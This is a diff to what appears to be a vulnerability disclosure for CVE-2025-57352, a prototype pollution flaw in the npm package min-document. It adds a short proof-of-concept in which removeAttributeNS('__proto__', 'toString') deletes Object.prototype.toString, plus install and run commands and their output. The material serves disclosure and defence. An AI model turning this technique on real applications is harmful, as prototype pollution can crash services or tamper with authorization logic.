@@ -73,8 +73,17 @@ console.log(anotherUser.role); // "admin"
 ```javascript
 const clazz = require("min-document/dom-element");
 let instance = new clazz();
+
+console.log({}.toString ? '[toString]':'[DELETE_TRIGGERED]');
 instance.removeAttributeNS('__proto__', 'toString');
-console.log({}.toString ? '':'[DELETE_TRIGGERED]');
+console.log({}.toString ? '[toString]':'[DELETE_TRIGGERED]');
+```
+
+```bash
+$ npm i min-document@2.19.0
+$ node poc.js
+[toString]
+[DELETE_TRIGGERED]
 ```
 
 https://github.com/OrangeShieldInfos/PoCs/blob/main/JavaScript/prototype-pollution/CVE-2025-57352/index.js
